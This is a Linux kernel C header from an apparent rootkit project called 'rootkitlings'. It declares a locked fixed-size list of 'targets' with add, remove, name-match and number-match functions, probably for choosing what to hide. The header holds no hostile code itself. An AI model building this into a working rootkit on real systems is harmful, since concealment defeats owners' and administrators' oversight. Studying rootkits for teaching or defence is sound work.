/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_TARGET_LIST_H
#define ROOTKITLINGS_TARGET_LIST_H

#include <linux/spinlock.h>
#include <linux/string.h>

#define RK_MAX_TARGETS 16
#define RK_TARGET_MAX_LEN 64

struct rk_target_list {
	spinlock_t lock;
	unsigned int count;
	char entries[RK_MAX_TARGETS][RK_TARGET_MAX_LEN];
};

static inline void rk_target_list_init(struct rk_target_list *list)
{
	spin_lock_init(&list->lock);
	list->count = 0;
}

int rk_target_add(struct rk_target_list *list, const char *value);

int rk_target_remove(struct rk_target_list *list, unsigned int index,
		     char *removed, size_t removed_size);

bool rk_target_match(struct rk_target_list *list, const char *name,
		     size_t name_length);

bool rk_target_number_match(struct rk_target_list *list, unsigned int value);

#endif
